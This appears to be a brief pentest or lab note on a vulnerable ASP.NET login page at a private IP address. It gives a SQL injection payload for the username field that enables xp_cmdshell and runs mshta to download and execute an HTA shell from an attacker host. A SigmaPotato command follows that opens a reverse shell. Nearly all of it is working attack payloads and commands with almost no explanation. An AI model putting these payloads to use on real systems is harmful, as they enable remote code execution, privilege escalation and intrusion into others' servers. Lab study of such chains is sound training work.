- Username at http://192.168.181.121/login.aspx appears vulnerable to sqlinjection

- The payload for username field in burp:
```
';EXECUTE xp_cmdshell 'powershell -e ""'; --
```

The payload that worked:
```
%3B%27EXECUTE+sp_configure+%27show+advanced+options%27%2C+1%3BRECONFIGURE%3BEXECUTE+sp_configure+%27xp_cmdshell%27%2C+1%3BRECONFIGURE%3BEXECUTE+xp_cmdshell+%27mshta http://192.168.45.173/shell.hta%27%3B+--&ctl00%24ContentPlaceHolder1%24PasswordTextBox=&ctl00%24ContentPlaceHolder1%24LoginButton=Login
```

Got reverseshell using sigma potatoe:
```
.\SigmaPotato --revshell 192.168.45.200 4445
```
